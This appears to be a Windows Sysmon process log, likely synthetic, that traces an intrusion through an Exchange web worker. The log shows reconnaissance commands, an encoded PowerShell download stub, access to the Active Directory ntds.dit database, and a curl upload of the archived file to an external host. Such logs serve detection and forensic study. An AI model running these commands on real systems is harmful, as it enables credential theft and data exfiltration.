{"EventID": 1, "UtcTime": "2026-05-03T09:11:01Z", "ProcessId": 4124, "Image": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "NT AUTHORITY\\SYSTEM", "ParentProcessId": 728, "ParentImage": "C:\\Windows\\System32\\services.exe"}
{"EventID": 1, "UtcTime": "2026-05-03T09:11:15Z", "ProcessId": 8842, "Image": "C:\\Windows\\System32\\inetsrv\\REDACTED", "CommandLine": "c:\\windows\\system32\\inetsrv\\REDACTED -ap \"MSExchangeOWAAppPool\" -v \"v4.0\"", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 1024, "ParentImage": "C:\\Windows\\System32\\inetsrv\\WAS.exe"}
{"EventID": 1, "UtcTime": "2026-05-03T09:15:08Z", "ProcessId": 9012, "Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe meeting-notes.txt", "User": "CONTOSO\\jsmith", "ParentProcessId": 4592, "ParentImage": "C:\\Windows\\explorer.exe"}
{"EventID": 1, "UtcTime": "2026-05-03T09:18:14Z", "ProcessId": 12044, "Image": "C:\\Windows\\System32\\REDACTED", "CommandLine": "cmd /c whoami", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 8842, "ParentImage": "C:\\Windows\\System32\\inetsrv\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T09:18:14Z", "ProcessId": 12048, "Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 12044, "ParentImage": "C:\\Windows\\System32\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T09:18:31Z", "ProcessId": 12096, "Image": "C:\\Windows\\System32\\REDACTED", "CommandLine": "cmd /c systeminfo", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 8842, "ParentImage": "C:\\Windows\\System32\\inetsrv\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T09:19:02Z", "ProcessId": 12118, "Image": "C:\\Windows\\System32\\REDACTED", "CommandLine": "cmd /c net user", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 8842, "ParentImage": "C:\\Windows\\System32\\inetsrv\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T09:23:48Z", "ProcessId": 12203, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 12198, "ParentImage": "C:\\Windows\\System32\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T09:23:48Z", "ProcessId": 12198, "Image": "C:\\Windows\\System32\\REDACTED", "CommandLine": "cmd /c powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 8842, "ParentImage": "C:\\Windows\\System32\\inetsrv\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T09:42:18Z", "ProcessId": 13511, "Image": "C:\\Windows\\System32\\REDACTED", "CommandLine": "cmd /c dir", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 8842, "ParentImage": "C:\\Windows\\System32\\inetsrv\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T10:04:55Z", "ProcessId": 14209, "Image": "C:\\Windows\\System32\\REDACTED", "CommandLine": "cmd /c tasklist", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 8842, "ParentImage": "C:\\Windows\\System32\\inetsrv\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T10:18:33Z", "ProcessId": 14918, "Image": "C:\\Windows\\System32\\esentutl.exe", "CommandLine": "esentutl /p C:\\Windows\\NTDS\\ntds.dit", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 14912, "ParentImage": "C:\\Windows\\System32\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T10:18:33Z", "ProcessId": 14912, "Image": "C:\\Windows\\System32\\REDACTED", "CommandLine": "cmd /c esentutl /p C:\\Windows\\NTDS\\ntds.dit", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 8842, "ParentImage": "C:\\Windows\\System32\\inetsrv\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T10:31:09Z", "ProcessId": 15401, "Image": "C:\\Program Files\\WinRAR\\rar.exe", "CommandLine": "rar a -hp$Pass C:\\temp\\out.rar C:\\temp\\ntds.dit", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 15395, "ParentImage": "C:\\Windows\\System32\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T10:34:51Z", "ProcessId": 15522, "Image": "C:\\Windows\\System32\\curl.exe", "CommandLine": "curl -T C:\\temp\\out.rar https://REDACTED/upload", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 15517, "ParentImage": "C:\\Windows\\System32\\REDACTED"}
{"EventID": 1, "UtcTime": "2026-05-03T10:34:51Z", "ProcessId": 15517, "Image": "C:\\Windows\\System32\\REDACTED", "CommandLine": "cmd /c curl -T C:\\temp\\out.rar https://REDACTED/upload", "User": "NT AUTHORITY\\IUSR", "ParentProcessId": 8842, "ParentImage": "C:\\Windows\\System32\\inetsrv\\REDACTED"}
